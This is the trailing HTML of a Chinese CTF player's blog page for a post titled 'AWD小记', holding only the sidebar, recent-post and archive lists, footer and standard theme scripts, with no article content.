+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/09/16/AWD%E5%B0%8F%E8%AE%B0/">http://example.com/2026/09/16/AWD%E5%B0%8F%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">X1z1的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/AWD/">AWD</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">PWN from zero to one .有问题之处，望多海涵。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/20/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8%E5%86%B3%E8%B5%9B/" title="磐石行动决赛">磐石行动决赛</a><time datetime="2026-09-20T01:21:51.000Z" title="发表于 2026-09-20 09:21:51">2026-09-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/16/AWD%E5%B0%8F%E8%AE%B0/" title="AWD小记">AWD小记</a><time datetime="2026-09-16T14:38:51.000Z" title="发表于 2026-09-16 22:38:51">2026-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/09/Thehackerslabs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="Thehackerslabs刷题记录">Thehackerslabs刷题记录</a><time datetime="2026-09-09T04:38:13.000Z" title="发表于 2026-09-09 12:38:13">2026-09-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/06/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8%E5%88%9D%E8%B5%9B/" title="磐石行动初赛">磐石行动初赛</a><time datetime="2026-09-06T03:52:16.000Z" title="发表于 2026-09-06 11:52:16">2026-09-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/29/CVE-2018-7034/" title="CVE-2018-7034 信息泄露">CVE-2018-7034 信息泄露</a><time datetime="2026-08-29T06:38:12.000Z" title="发表于 2026-08-29 14:38:12">2026-08-29</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CVE%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">CVE复现</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IO/"><span class="card-category-list-name">IO</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">9</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">12</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.37em; color: #99a4b2">pwn入门</a> <a href="/tags/AWD/" style="font-size: 1.1em; color: #999">AWD</a> <a href="/tags/pwn/" style="font-size: 1.5em; color: #99a9bf">pwn</a> <a href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" style="font-size: 1.1em; color: #999">靶机渗透</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.1em; color: #999">C语言</a> <a href="/tags/IOT/" style="font-size: 1.23em; color: #999ea6">IOT</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.37em; color: #99a4b2">pwn进阶</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      <a class="card-more-btn" href="/archives/"
+            title="查看更多">
+            <i class="fas fa-angle-right"></i>
+          </a>
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/09/">
+            <span class="card-archive-list-date">
+              九月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/08/">
+            <span class="card-archive-list-date">
+              八月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/07/">
+            <span class="card-archive-list-date">
+              七月 2026
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/06/">
+            <span class="card-archive-list-date">
+              六月 2026
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/05/">
+            <span class="card-archive-list-date">
+              五月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/04/">
+            <span class="card-archive-list-date">
+              四月 2026
+            </span>
+            <span class="card-archive-list-count">5</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              三月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">9</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">45</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-09-20T04:06:39.446Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>
